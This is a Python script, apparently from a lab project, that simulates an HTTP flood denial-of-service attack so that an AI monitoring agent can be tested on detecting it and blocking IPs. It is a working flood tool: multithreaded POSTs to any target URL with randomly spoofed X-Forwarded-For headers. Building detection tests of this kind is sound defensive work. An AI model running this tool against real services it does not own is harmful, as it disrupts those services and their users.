# simulators/ddos_simulator.py
# ============================================================
# EXTERNAL TRAFFIC SOURCE — DDoS Simulator (ATTACK TRAFFIC)
# ============================================================
# Giả lập tấn công HTTP Flood để kiểm tra khả năng phát hiện của AI Agent.
#
# Data flow:
#   Script này → Nginx Ingress → target-app (bị quá tải)
#   → Prometheus ghi nhận latency tăng → Agent phát hiện → chặn IP
#
# Đặc điểm DDoS mà Agent cần phát hiện:
#   1. Nhiều source IP khác nhau (X-Forwarded-For đa dạng)
#   2. Spike đột ngột trong request rate
#   3. Pattern đồng đều (cùng endpoint, cùng payload structure)
#
# IMPORTANT: Chỉ dùng cho mục đích học tập/testing trên hạ tầng của bạn.
#
# Usage:
#   python ddos_simulator.py --target http://localhost:8000 --threads 10 --duration 60
# ============================================================

import argparse
import random
import time
import threading
import requests


# Thống kê real-time
stats = {"sent": 0, "success": 0, "failed": 0, "total_latency": 0.0}
stats_lock = threading.Lock()


def generate_spoofed_ip():
    """
    Tạo IP giả ngẫu nhiên cho header X-Forwarded-For.

    Tại sao spoof IP?
      - DDoS thật dùng botnet → IP đến từ nhiều nơi khác nhau
      - Agent cần detect: "nhiều unique IP + spike đột ngột" = DDoS
      - Ngược lại organic overload: ít IP + tăng dần = scale up
    """
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def attack_thread(target_url, duration, thread_id):
    """
    1 thread gửi HTTP POST liên tục trong `duration` giây.

    Mỗi request:
      - POST /collect với payload giống nhau (uniform pattern = dấu hiệu DDoS)
      - Header X-Forwarded-For với IP ngẫu nhiên (IP diversity = dấu hiệu DDoS)
      - Timeout ngắn (2s) để không block thread quá lâu
    """
    end_time = time.time() + duration
    # Payload đồng đều — DDoS không có variation như organic traffic
    payload = {"device_id": "flood", "heart_rate": 0, "timestamp": 0}

    while time.time() < end_time:
        spoofed_ip = generate_spoofed_ip()
        headers = {"X-Forwarded-For": spoofed_ip}
        payload["timestamp"] = time.time()

        try:
            start = time.time()
            resp = requests.post(f"{target_url}/collect", json=payload, headers=headers, timeout=2)
            latency = (time.time() - start) * 1000

            with stats_lock:
                stats["sent"] += 1
                stats["total_latency"] += latency
                if resp.status_code == 200:
                    stats["success"] += 1
                else:
                    stats["failed"] += 1
        except (requests.Timeout, requests.ConnectionError):
            with stats_lock:
                stats["sent"] += 1
                stats["failed"] += 1


def print_stats(duration):
    """In thống kê mỗi 5 giây — giúp quan sát ảnh hưởng real-time."""
    end_time = time.time() + duration
    while time.time() < end_time:
        time.sleep(5)
        with stats_lock:
            sent = stats["sent"]
            avg_lat = (stats["total_latency"] / sent) if sent > 0 else 0
            rps = sent / max(1, time.time() - (end_time - duration))
            print(f"  [STATS] Sent={sent} Success={stats['success']} "
                  f"Failed={stats['failed']} AvgLatency={avg_lat:.1f}ms RPS={rps:.0f}")


def main():
    parser = argparse.ArgumentParser(description="DDoS HTTP Flood Simulator (Educational)")
    parser.add_argument("--target", required=True, help="Target URL, vd: http://localhost:8000")
    parser.add_argument("--threads", type=int, default=10, help="Số thread tấn công (default: 10)")
    parser.add_argument("--duration", type=int, default=60, help="Thời gian tấn công giây (default: 60)")
    args = parser.parse_args()

    print(f"[DDoS] Target: {args.target}")
    print(f"[DDoS] Threads: {args.threads}, Duration: {args.duration}s")
    print(f"[DDoS] Starting HTTP flood...")
    print("=" * 60)

    # Thread in thống kê
    monitor = threading.Thread(target=print_stats, args=(args.duration,), daemon=True)
    monitor.start()

    # Spawn attack threads
    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=attack_thread, args=(args.target, args.duration, i), daemon=True)
        t.start()
        threads.append(t)

    # Chờ tất cả thread hoàn thành
    for t in threads:
        t.join()

    # Kết quả cuối cùng
    print("=" * 60)
    sent = stats["sent"]
    avg_lat = (stats["total_latency"] / sent) if sent > 0 else 0
    print(f"[DDoS] COMPLETED")
    print(f"  Total requests: {sent}")
    print(f"  Success: {stats['success']}")
    print(f"  Failed:  {stats['failed']}")
    print(f"  Avg latency: {avg_lat:.1f}ms")
    print(f"  Avg RPS: {sent / args.duration:.0f}")


if __name__ == "__main__":
    main()
